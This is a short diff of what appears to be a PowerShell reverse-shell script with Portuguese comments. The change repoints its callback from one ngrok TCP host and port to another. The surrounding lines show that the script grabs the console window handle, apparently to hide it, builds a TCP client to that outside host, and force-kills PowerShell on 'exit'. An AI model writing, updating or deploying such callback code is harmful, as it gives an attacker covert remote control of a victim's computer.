@@ -16,8 +16,8 @@ $hwnd = [WinAPI]::GetConsoleWindow()
 # -----------------------------
 # CONFIGURAÇÕES NGROK
 # -----------------------------
-$ngrokHost = "6.tcp.eu.ngrok.io"
-$ngrokPort = 12907
+$ngrokHost = "0.tcp.eu.ngrok.io"
+$ngrokPort = 18571
 
 # -----------------------------
 # CRIAR TCP CLIENTE
@@ -72,6 +72,7 @@ try {
 # ENCERRA POWERHELL AO DIGITAR exit
 # -----------------------------
 Stop-Process -Id $PID -Force
+
 
 
 
